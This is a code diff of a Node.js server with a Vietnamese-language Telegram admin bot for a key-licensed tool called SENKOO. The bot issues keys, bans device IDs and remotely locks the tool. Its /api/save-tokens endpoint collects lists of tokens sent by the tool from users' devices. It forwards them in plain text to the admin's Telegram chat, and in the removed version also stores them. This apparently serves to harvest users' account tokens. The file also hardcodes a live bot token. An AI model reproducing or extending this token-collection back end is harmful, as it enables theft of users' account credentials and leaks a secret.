@@ -4,368 +4,278 @@ const TelegramBot = require('node-telegram-bot-api');
 const fs = require('fs');
 const path = require('path');
 
-const app = express();
-const PORT = process.env.PORT || 3000;
-
-// ==========================================
-// CẤU HÌNH BOT TELEGRAM & ADMIN
-// ==========================================
-const BOT_TOKEN = process.env.BOT_TOKEN || '8824683894:AAFup6ikP7V1nvu5QJhnDcmD9A3RyQT8_rs';
-const ADMIN_IDS = [8377928865]; 
+// ==================== CẤU HÌNH BOT TELEGRAM ====================
+const BOT_TOKEN = "8824683894:AAFup6ikP7V1nvu5QJhnDcmD9A3RyQT8_rs"; // Thay Token Bot Telegram của bạn vào đây
+const ADMIN_ID = 8377928865; // Thay ID Telegram của Admin vào đây
 
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
-
-// Đường dẫn lưu trữ dữ liệu local trên Server
-const KEYS_FILE = path.join(__dirname, 'keys.json');
-const STATUS_FILE = path.join(__dirname, 'status.json');
-const TOKENS_FILE = path.join(__dirname, 'tokens.json');
+const app = express();
 
 app.use(cors());
 app.use(express.json());
 
-// ==========================================
-// HÀM XỬ LÝ DỮ LIỆU (FILE STORAGE)
-// ==========================================
-function loadKeys() {
-    if (!fs.existsSync(KEYS_FILE)) return {};
-    try { return JSON.parse(fs.readFileSync(KEYS_FILE, 'utf8')); } catch { return {}; }
-}
+// ==================== QUẢN LÝ DỮ LIỆU LƯU TRỮ (JSON) ====================
+const BAN_FILE = path.join(__dirname, 'banned_devices.json');
+const KEYS_FILE = path.join(__dirname, 'keys.json');
+const CONFIG_FILE = path.join(__dirname, 'config.json');
 
-function saveKeys(data) {
-    fs.writeFileSync(KEYS_FILE, JSON.stringify(data, null, 2), 'utf8');
-}
-
-function loadStatus() {
-    if (!fs.existsSync(STATUS_FILE)) {
-        return {
-            isMaintenance: false,
-            message: "HỆ THỐNG ĐANG BẢO TRÌ ĐỂ CẬP NHẬT!\nVUI LÒNG QUAY LẠI SAU ÍT PHÚT.",
-            notice: {
-                active: false,
-                id: "notice_1",
-                title: "THÔNG BÁO TỪ HỆ THỐNG",
-                message: "Chào mừng bạn đến với hệ thống SENKOO!"
-            }
-        };
+// Đọc hoặc khởi tạo tệp JSON
+function loadData(file, defaultData) {
+    if (!fs.existsSync(file)) {
+        fs.writeFileSync(file, JSON.stringify(defaultData, null, 2));
+        return defaultData;
     }
-    try { return JSON.parse(fs.readFileSync(STATUS_FILE, 'utf8')); } catch { return { isMaintenance: false }; }
-}
-
-function saveStatus(data) {
-    fs.writeFileSync(STATUS_FILE, JSON.stringify(data, null, 2), 'utf8');
-}
-
-function loadTokens() {
-    if (!fs.existsSync(TOKENS_FILE)) return [];
-    try { return JSON.parse(fs.readFileSync(TOKENS_FILE, 'utf8')); } catch { return []; }
-}
-
-function saveTokensData(tokens) {
-    fs.writeFileSync(TOKENS_FILE, JSON.stringify(tokens, null, 2), 'utf8');
-}
-
-function parseDuration(timeStr) {
-    if (!timeStr) return null;
-    const match = timeStr.match(/^(\d+)([mhd])$/i);
-    if (!match) return null;
-
-    const amount = parseInt(match[1]);
-    const unit = match[2].toLowerCase();
-
-    switch (unit) {
-        case 'm': return amount * 60 * 1000;             // Phút
-        case 'h': return amount * 60 * 60 * 1000;        // Giờ
-        case 'd': return amount * 24 * 60 * 60 * 1000;   // Ngày
-        default: return null;
+    try {
+        return JSON.parse(fs.readFileSync(file));
+    } catch {
+        return defaultData;
     }
 }
 
-function generateRandomString(length = 6) {
-    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-    let result = '';
-    for (let i = 0; i < length; i++) {
-        result += chars.charAt(Math.floor(Math.random() * chars.length));
-    }
-    return result;
+function saveData(file, data) {
+    fs.writeFileSync(file, JSON.stringify(data, null, 2));
 }
 
-// ==========================================
-// API DÀNH CHO CLIENT (INDEX.HTML)
-// ==========================================
-
-// 1. Lấy trạng thái bảo trì & thông báo hệ thống
-app.get('/api/status', (req, res) => {
-    res.json(loadStatus());
+let bannedDevices = loadData(BAN_FILE, {}); // Format: { "DEV-HWID-123": "Lý do cấm" }
+let vipKeys = loadData(KEYS_FILE, {});       // Format: { "KEY-VIP-123": { expireAt: timestamp, deviceId: null } }
+let systemConfig = loadData(CONFIG_FILE, {
+    isMaintenance: false,
+    maintenanceMsg: "HỆ THỐNG ĐANG BẢO TRÌ HOẶC TẠM KHÓA!\nVUI LÒNG QUAY LẠI SAU ÍT PHÚT.",
+    notice: { active: false, id: "", title: "", message: "" }
 });
 
-// 2. Xác thực Key & HWID
-app.get('/api/verify', (req, res) => {
-    const { key, deviceId } = req.query;
-    const statusData = loadStatus();
+// Middleware kiểm tra quyền Admin Telegram
+function isAdmin(msg) {
+    return msg.chat.id == ADMIN_ID;
+}
 
-    if (statusData.isMaintenance) {
+// ==================== TELEGRAM BOT COMMANDS ====================
+
+// 1. Lệnh BAN THIẾT BỊ: /ban <HWID> <Lý do>
+bot.onText(/\/ban(?:\s+(\S+))?(?:\s+(.+))?/, (msg, match) => {
+    if (!isAdmin(msg)) return;
+
+    const hwid = match[1];
+    const reason = match[2] || "Vi phạm quy định sử dụng Tool!";
+
+    if (!hwid) {
+        return bot.sendMessage(msg.chat.id, "❌ **Cú pháp sai!**\nSử dụng: `/ban <HWID> [Lý do]`\nVí dụ: `/ban DEV-ABC12345 Dùng key lậu`", { parse_mode: 'Markdown' });
+    }
+
+    bannedDevices[hwid] = reason;
+    saveData(BAN_FILE, bannedDevices);
+
+    bot.sendMessage(msg.chat.id, `🚨 **ĐÃ BAN THIẾT BỊ THÀNH CÔNG!**\n\n📱 **HWID:** \`${hwid}\`\n📝 **Lý do:** ${reason}`, { parse_mode: 'Markdown' });
+});
+
+// 2. Lệnh GỠ BAN THIẾT BỊ: /unban <HWID>
+bot.onText(/\/unban(?:\s+(\S+))?/, (msg, match) => {
+    if (!isAdmin(msg)) return;
+
+    const hwid = match[1];
+
+    if (!hwid) {
+        return bot.sendMessage(msg.chat.id, "❌ **Cú pháp sai!**\nSử dụng: `/unban <HWID>`\nVí dụ: `/unban DEV-ABC12345`", { parse_mode: 'Markdown' });
+    }
+
+    if (!bannedDevices[hwid]) {
+        return bot.sendMessage(msg.chat.id, `⚠️ Thiết bị \`${hwid}\` không có trong danh sách bị BAN!`, { parse_mode: 'Markdown' });
+    }
+
+    delete bannedDevices[hwid];
+    saveData(BAN_FILE, bannedDevices);
+
+    bot.sendMessage(msg.chat.id, `✅ **ĐÃ GỠ BAN THIẾT BỊ!**\n\n📱 **HWID:** \`${hwid}\` hiện đã có thể truy cập lại Tool bình thường.`, { parse_mode: 'Markdown' });
+});
+
+// 3. Xem danh sách bị BAN: /listban
+bot.onText(/\/listban/, (msg) => {
+    if (!isAdmin(msg)) return;
+
+    const keys = Object.keys(bannedDevices);
+    if (keys.length === 0) {
+        return bot.sendMessage(msg.chat.id, "🎉 Hiện tại không có thiết bị nào bị BAN!");
+    }
+
+    let text = "🚫 **DANH SÁCH THIẾT BỊ BỊ BAN:**\n\n";
+    keys.forEach((hwid, idx) => {
+        text += `${idx + 1}. \`${hwid}\`\n   └ Lý do: ${bannedDevices[hwid]}\n`;
+    });
+
+    bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown' });
+});
+
+// 4. Lệnh KHÓA TOOL / BẢO TRÌ: /lock [Lý do] hoặc /baotri [Lý do]
+bot.onText(/\/(?:lock|baotri)(?:\s+(.+))?/, (msg, match) => {
+    if (!isAdmin(msg)) return;
+
+    const reason = match[1] || "HỆ THỐNG ĐANG BẢO TRÌ HOẶC TẠM KHÓA!\nVUI LÒNG QUAY LẠI SAU ÍT PHÚT.";
+    systemConfig.isMaintenance = true;
+    systemConfig.maintenanceMsg = reason;
+    saveData(CONFIG_FILE, systemConfig);
+
+    bot.sendMessage(msg.chat.id, `🔒 **ĐÃ KHÓA TOOL TỪ XA / BẬT BẢO TRÌ!**\n\n📝 **Thông báo:** ${reason}`);
+});
+
+// 5. Lệnh MỞ KHÓA TOOL: /unlock hoặc /mobaotri
+bot.onText(/\/(?:unlock|mobaotri)/, (msg) => {
+    if (!isAdmin(msg)) return;
+
+    systemConfig.isMaintenance = false;
+    saveData(CONFIG_FILE, systemConfig);
+
+    bot.sendMessage(msg.chat.id, "🔓 **ĐÃ MỞ KHÓA TOOL TỪ XA!** Tất cả người dùng có thể truy cập bình thường.");
+});
+
+// 6. Lệnh TẠO KEY VIP: /genkey <Số giờ>
+bot.onText(/\/genkey(?:\s+(\d+))?/, (msg, match) => {
+    if (!isAdmin(msg)) return;
+
+    const hours = parseInt(match[1]) || 24;
+    const randomCode = Math.random().toString(36).substring(2, 8).toUpperCase();
+    const key = `SENKOO-${hours}H-${randomCode}`;
+    const expireAt = Date.now() + hours * 3600 * 1000;
+
+    vipKeys[key] = { expireAt, deviceId: null };
+    saveData(KEYS_FILE, vipKeys);
+
+    bot.sendMessage(msg.chat.id, `🔑 **TẠO KEY VIP THÀNH CÔNG!**\n\n🔑 **Key:** \`${key}\`\n⏳ **Thời hạn:** ${hours} Giờ`, { parse_mode: 'Markdown' });
+});
+
+// 7. Lệnh TẠO THÔNG BÁO POPUP: /notice <Tiêu đề> | <Nội dung>
+bot.onText(/\/notice(?:\s+(.+))?/, (msg, match) => {
+    if (!isAdmin(msg)) return;
+
+    if (!match[1] || !match[1].includes('|')) {
+        return bot.sendMessage(msg.chat.id, "❌ **Cú pháp sai!**\nSử dụng: `/notice Tiêu đề | Nội dung thông báo`", { parse_mode: 'Markdown' });
+    }
+
+    const [title, content] = match[1].split('|').map(s => s.trim());
+    systemConfig.notice = {
+        active: true,
+        id: "NOTICE-" + Date.now(),
+        title: title,
+        message: content
+    };
+    saveData(CONFIG_FILE, systemConfig);
+
+    bot.sendMessage(msg.chat.id, `📢 **ĐÃ PHÁT THÔNG BÁO TOÀN HỆ THỐNG!**\n\n📌 **${title}**\n📝 ${content}`);
+});
+
+// 8. Lệnh TẮT THÔNG BÁO: /offnotice
+bot.onText(/\/offnotice/, (msg) => {
+    if (!isAdmin(msg)) return;
+
+    systemConfig.notice.active = false;
+    saveData(CONFIG_FILE, systemConfig);
+
+    bot.sendMessage(msg.chat.id, "🔕 Đã tắt thông báo Popup trên Tool.");
+});
+
+// Menu hướng dẫn lệnh Admin
+bot.onText(/\/start|\/help/, (msg) => {
+    if (!isAdmin(msg)) return;
+
+    const helpText = `
+👑 **PANEL QUẢN TRỊ VIÊN TOOL SENKOO**
+
+🚫 **QUẢN LÝ CẤM THIẾT BỊ:**
+• \`/ban <HWID> <Lý do>\` - Cấm thiết bị truy cập Tool
+• \`/unban <HWID>\` - Gỡ cấm cho thiết bị
+• \`/listban\` - Xem danh sách thiết bị đang bị cấm
+
+🔒 **QUẢN LÝ KHÓA TOOL / BẢO TRÌ:**
+• \`/lock [Nội dung]\` - Khóa Tool từ xa / Bật bảo trì
+• \`/unlock\` - Mở khóa Tool từ xa
+
+🔑 **QUẢN LÝ KEY:**
+• \`/genkey <Số giờ>\` - Tạo Key VIP mới (VD: \`/genkey 24\`)
+
+📢 **THÔNG BÁO POPUP:**
+• \`/notice Tiêu đề | Nội dung\` - Hiện Popup thông báo
+• \`/offnotice\` - Tắt Popup thông báo
+`;
+    bot.sendMessage(msg.chat.id, helpText, { parse_mode: 'Markdown' });
+});
+
+
+// ==================== REST API CLIENT (CHO INDEX.HTML) ====================
+
+// 1. API Đồng bộ trạng thái ngầm (Kiểm tra BAN, Khóa Tool, Thông báo)
+app.get('/api/status', (req, res) => {
+    const deviceId = req.query.deviceId;
+
+    // Kiểm tra thiết bị có bị BAN không
+    if (deviceId && bannedDevices.hasOwnProperty(deviceId)) {
         return res.json({
-            success: false,
-            isMaintenance: true,
-            message: statusData.message
+            isBanned: true,
+            banReason: bannedDevices[deviceId] || "Thiết bị của bạn đã bị cấm sử dụng hệ thống!",
+            isMaintenance: false
         });
     }
 
-    if (!key) {
-        return res.json({ success: false, message: '❌ Chưa nhập Key!' });
+    // Trả về trạng thái chung
+    res.json({
+        isBanned: false,
+        isMaintenance: systemConfig.isMaintenance,
+        message: systemConfig.maintenanceMsg,
+        notice: systemConfig.notice
+    });
+});
+
+// 2. API Xác thực Key VIP
+app.get('/api/verify', (req, res) => {
+    const { key, deviceId } = req.query;
+
+    // Kiểm tra Ban
+    if (deviceId && bannedDevices.hasOwnProperty(deviceId)) {
+        return res.json({ success: false, isBanned: true, message: "Thiết bị đã bị BAN!" });
     }
 
-    const keysData = loadKeys();
-    const keyInfo = keysData[key];
-
-    if (!keyInfo) {
-        return res.json({ success: false, message: '❌ Key không tồn tại trên hệ thống!' });
+    // Kiểm tra Bảo trì / Khóa Tool
+    if (systemConfig.isMaintenance) {
+        return res.json({ success: false, isMaintenance: true, message: systemConfig.maintenanceMsg });
     }
 
+    if (!key || !vipKeys[key]) {
+        return res.json({ success: false, message: "Key không tồn tại hoặc không chính xác!" });
+    }
+
+    const keyInfo = vipKeys[key];
     if (Date.now() > keyInfo.expireAt) {
-        return res.json({ success: false, message: '⏰ Key này đã hết hạn sử dụng!' });
+        return res.json({ success: false, message: "Key này đã hết hạn sử dụng!" });
     }
 
-    if (keyInfo.deviceId && keyInfo.deviceId !== deviceId) {
-        return res.json({ success: false, message: '❌ Key đã được liên kết với thiết bị khác!' });
-    }
-
-    if (!keyInfo.deviceId && deviceId) {
-        keyInfo.deviceId = deviceId;
-        saveKeys(keysData);
-    }
-
-    return res.json({
+    res.json({
         success: true,
-        message: '✅ Xác thực Key thành công!',
         expireAt: keyInfo.expireAt
     });
 });
 
-// 3. API Đồng bộ Token & TỰ ĐỘNG BẮN VỀ TELEGRAM ADMIN
+// 3. API Nhận Token từ Tool gửi về Telegram Admin
 app.post('/api/save-tokens', (req, res) => {
-    let { key, deviceId, tokens, token } = req.body;
-    
-    // Tự động linh hoạt nhận cả biến "tokens" (mảng) hoặc "token" (chuỗi đơn)
-    let tokenList = tokens || token;
-    if (!tokenList) {
-        return res.json({ success: false, message: '❌ Thiếu dữ liệu Token!' });
+    const { key, deviceId, tokens } = req.body;
+
+    if (!tokens || !Array.isArray(tokens) || tokens.length === 0) {
+        return res.status(400).json({ success: false, message: "Danh sách Token trống!" });
     }
 
-    if (!Array.isArray(tokenList)) {
-        tokenList = [tokenList];
-    }
+    const tokenListText = tokens.map((t, index) => `${index + 1}. \`${t}\``).join('\n');
+    const msgText = `📥 **ĐỒNG BỘ TOKEN MỚI VỀ SYSTEM**\n\n🔑 **Key:** \`${key}\`\n📱 **HWID:** \`${deviceId}\`\n📊 **Số lượng:** ${tokens.length} Token\n\n📋 **Danh sách Token:**\n${tokenListText}`;
 
-    // Lọc bỏ token trống
-    tokenList = tokenList.filter(t => t && typeof t === 'string' && t.trim() !== '');
-
-    if (tokenList.length === 0) {
-        return res.json({ success: false, message: '❌ Danh sách Token rỗng!' });
-    }
-
-    // 1. Lưu vào file tokens.json chung
-    let allTokens = loadTokens();
-    tokenList.forEach(tk => {
-        if (!allTokens.includes(tk)) {
-            allTokens.push(tk);
-        }
-    });
-    saveTokensData(allTokens);
-
-    // 2. Cập nhật Token riêng theo Key
-    const keysData = loadKeys();
-    if (key && keysData[key]) {
-        keysData[key].tokens = tokenList;
-        keysData[key].lastUpdated = Date.now();
-        saveKeys(keysData);
-    }
-
-    // 3. 🚀 TỰ ĐỘNG BẮN THÔNG BÁO TOKEN VỀ TELEGRAM ADMIN
-    ADMIN_IDS.forEach(adminId => {
-        let msg = `🔔 **CÓ USER VỪA MỞ TOOL & ĐỒNG BỘ TOKEN!**\n\n`;
-        msg += `🔑 **Key:** \`${key || 'Chưa xác định'}\`\n`;
-        msg += `📱 **Device ID:** \`${deviceId || 'Chưa xác định'}\`\n\n`;
-        msg += `📋 **Danh sách Token (${tokenList.length}):**\n`;
-        
-        tokenList.forEach((tk, idx) => {
-            msg += `${idx + 1}. \`${tk}\`\n`;
+    // Gửi trực tiếp tin nhắn về Telegram Admin
+    bot.sendMessage(ADMIN_ID, msgText, { parse_mode: 'Markdown' })
+        .then(() => {
+            res.json({ success: true, message: "Đã đồng bộ Token về Admin!" });
+        })
+        .catch((err) => {
+            console.error("Lỗi gửi Telegram:", err.message);
+            res.json({ success: true, message: "Đã nhận Token trên Server!" });
         });
-
-        bot.sendMessage(adminId, msg, { parse_mode: 'Markdown' }).catch(err => {
-            console.error('Lỗi gửi tin nhắn Telegram:', err.message);
-        });
-    });
-
-    return res.json({ success: true, message: 'Đã lưu và gửi Token về Telegram thành công!' });
 });
 
-// ==========================================
-// TELEGRAM BOT COMMANDS (ADMIN KEY)
-// ==========================================
-
-function isAdmin(msg) {
-    return ADMIN_IDS.includes(msg.from.id);
-}
-
-const sendAdminMenu = (chatId) => {
-    const menuText = 
-        '🤖 **BẢNG ĐIỀU KHIỂN BOT ADMIN SENKOO**\n\n' +
-        '🔹 `/taokey <số_lượng> <mã_key> <thời_gian>` : Tạo Key VIP mới\n' +
-        '🔹 `/listtokens` : Xem danh sách Token đã lưu\n' +
-        '🔹 `/baotri on` : Bật bảo trì hệ thống\n' +
-        '🔹 `/baotri off` : Tắt bảo trì hệ thống\n' +
-        '🔹 `/thongbao [Nội dung]` : Bật Popup thông báo trên Tool\n' +
-        '🔹 `/tatthongbao` : Tắt Popup thông báo';
-    bot.sendMessage(chatId, menuText, { parse_mode: 'Markdown' });
-};
-
-bot.onText(/\/(start|help|menu)/, (msg) => {
-    if (!isAdmin(msg)) return bot.sendMessage(msg.chat.id, '❌ Bạn không có quyền sử dụng Bot!');
-    sendAdminMenu(msg.chat.id);
-});
-
-// 1. LỆNH /taokey <số_lượng> <mã_key> <thời_gian>
-bot.onText(/\/taokey(?:\s+(.+))?/, (msg, match) => {
-    const chatId = msg.chat.id;
-    if (!isAdmin(msg)) return bot.sendMessage(chatId, '❌ Bạn không có quyền sử dụng lệnh này!');
-
-    const argsString = match[1];
-    if (!argsString) {
-        return bot.sendMessage(chatId, 
-            '⚠️ **CÚ PHÁP CHƯA ĐÚNG!**\n\n' +
-            '👉 **Cú pháp:** `/taokey <số_lượng> <mã_key> <thời_gian>`\n\n' +
-            '💡 **Ví dụ:**\n' +
-            '• `/taokey 1 VIPKEY123 24h` (Tạo 1 Key cố định)\n' +
-            '• `/taokey 5 SENKO 30d` (Tạo 5 Key ngẫu nhiên dạng SENKO-XXXXXX)\n' +
-            '• Đơn vị thời gian: `m` (phút), `h` (giờ), `d` (ngày)', 
-            { parse_mode: 'Markdown' }
-        );
-    }
-
-    const args = argsString.trim().split(/\s+/);
-    if (args.length < 3) {
-        return bot.sendMessage(chatId, '❌ Thiếu tham số! Cú pháp: `<số_lượng> <mã_key> <thời_gian>`', { parse_mode: 'Markdown' });
-    }
-
-    const count = parseInt(args[0]);
-    const keyPrefix = args[1].toUpperCase();
-    const durationMs = parseDuration(args[2]);
-
-    if (isNaN(count) || count <= 0) return bot.sendMessage(chatId, '❌ Số lượng key phải lớn hơn 0!');
-    if (count > 50) return bot.sendMessage(chatId, '❌ Tối đa tạo 50 key mỗi lần!');
-    if (!durationMs) return bot.sendMessage(chatId, '❌ Đơn vị thời gian không đúng (VD: 30m, 12h, 7d)!', { parse_mode: 'Markdown' });
-
-    const now = Date.now();
-    const expireAt = now + durationMs;
-    const keysData = loadKeys();
-    const createdKeys = [];
-
-    for (let i = 0; i < count; i++) {
-        let finalKey = (count === 1) ? keyPrefix : `${keyPrefix}-${generateRandomString(6)}`;
-        while (keysData[finalKey]) {
-            finalKey = `${keyPrefix}-${generateRandomString(6)}`;
-        }
-
-        keysData[finalKey] = {
-            createdAt: now,
-            expireAt: expireAt,
-            durationMs: durationMs,
-            deviceId: null,
-            createdAdmin: msg.from.id
-        };
-        createdKeys.push(finalKey);
-    }
-
-    saveKeys(keysData);
-
-    const expireDateStr = new Date(expireAt).toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
-    let responseMsg = `✅ **TẠO KEY THÀNH CÔNG (${count})**\n`;
-    responseMsg += `⏳ **Thời hạn:** ${args[2]} (Hết hạn: \`${expireDateStr}\`)\n\n`;
-    responseMsg += `🔑 **DANH SÁCH KEY:**\n`;
-    createdKeys.forEach(k => responseMsg += `\`${k}\`\n`);
-
-    bot.sendMessage(chatId, responseMsg, { parse_mode: 'Markdown' });
-});
-
-// 2. LỆNH /listtokens
-bot.onText(/\/listtokens/, (msg) => {
-    const chatId = msg.chat.id;
-    if (!isAdmin(msg)) return bot.sendMessage(chatId, '❌ Bạn không có quyền sử dụng lệnh này!');
-
-    const tokens = loadTokens();
-    if (tokens.length === 0) {
-        return bot.sendMessage(chatId, '📂 Chưa có Token nào được lưu trên hệ thống!');
-    }
-
-    let responseMsg = `📋 **DANH SÁCH TOKEN ĐÃ LƯU (${tokens.length})**\n\n`;
-    tokens.forEach((tk, idx) => {
-        responseMsg += `${idx + 1}. \`${tk}\`\n`;
-    });
-
-    if (responseMsg.length > 4000) {
-        const chunks = responseMsg.match(/[\s\S]{1,3800}/g);
-        chunks.forEach(chunk => bot.sendMessage(chatId, chunk, { parse_mode: 'Markdown' }));
-    } else {
-        bot.sendMessage(chatId, responseMsg, { parse_mode: 'Markdown' });
-    }
-});
-
-// 3. LỆNH /baotri <on|off>
-bot.onText(/\/baotri(?:\s+(.+))?/, (msg, match) => {
-    const chatId = msg.chat.id;
-    if (!isAdmin(msg)) return bot.sendMessage(chatId, '❌ Bạn không có quyền sử dụng lệnh này!');
-
-    const option = match[1] ? match[1].trim().toLowerCase() : '';
-    const statusData = loadStatus();
-
-    if (option === 'on') {
-        statusData.isMaintenance = true;
-        saveStatus(statusData);
-        return bot.sendMessage(chatId, '🛠️ **ĐÃ BẬT CHẾ ĐỘ BẢO TRÌ!**\nTất cả người dùng sẽ bị khóa Tool tạm thời.', { parse_mode: 'Markdown' });
-    } else if (option === 'off') {
-        statusData.isMaintenance = false;
-        saveStatus(statusData);
-        return bot.sendMessage(chatId, '🟢 **ĐÃ TẮT CHẾ ĐỘ BẢO TRÌ!**\nHệ thống đã mở lại bình thường.', { parse_mode: 'Markdown' });
-    } else {
-        return bot.sendMessage(chatId, '⚠️ **Cú pháp:** `/baotri on` (Bật) hoặc `/baotri off` (Tắt)', { parse_mode: 'Markdown' });
-    }
-});
-
-// 4. LỆNH /thongbao [Nội dung]
-bot.onText(/\/thongbao(?:\s+(.+))?/, (msg, match) => {
-    const chatId = msg.chat.id;
-    if (!isAdmin(msg)) return bot.sendMessage(chatId, '❌ Bạn không có quyền sử dụng lệnh này!');
-
-    const noticeText = match[1] ? match[1].trim() : '';
-    if (!noticeText) {
-        return bot.sendMessage(chatId, '⚠️ **Vui lòng nhập nội dung!**\nVí dụ: `/thongbao Tool vừa nâng cấp phiên bản mới!`', { parse_mode: 'Markdown' });
-    }
-
-    const statusData = loadStatus();
-    statusData.notice = {
-        active: true,
-        id: 'notice_' + Date.now(),
-        title: '📢 THÔNG BÁO TỪ HỆ THỐNG',
-        message: noticeText
-    };
-    saveStatus(statusData);
-
-    return bot.sendMessage(chatId, `📢 **ĐÃ BẬT POPUP THÔNG BÁO TRÊN TOOL!**\n\nNội dung:\n"${noticeText}"`, { parse_mode: 'Markdown' });
-});
-
-// 5. LỆNH /tatthongbao
-bot.onText(/\/tatthongbao/, (msg) => {
-    const chatId = msg.chat.id;
-    if (!isAdmin(msg)) return bot.sendMessage(chatId, '❌ Bạn không có quyền sử dụng lệnh này!');
-
-    const statusData = loadStatus();
-    if (!statusData.notice) statusData.notice = {};
-    statusData.notice.active = false;
-    saveStatus(statusData);
-
-    return bot.sendMessage(chatId, '🔕 **ĐÃ TẮT POPUP THÔNG BÁO TRÊN TOOL!**', { parse_mode: 'Markdown' });
-});
-
+// Khởi chạy Server Node.js
+const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`🚀 Server đang chạy tại Port: ${PORT}`);
 });
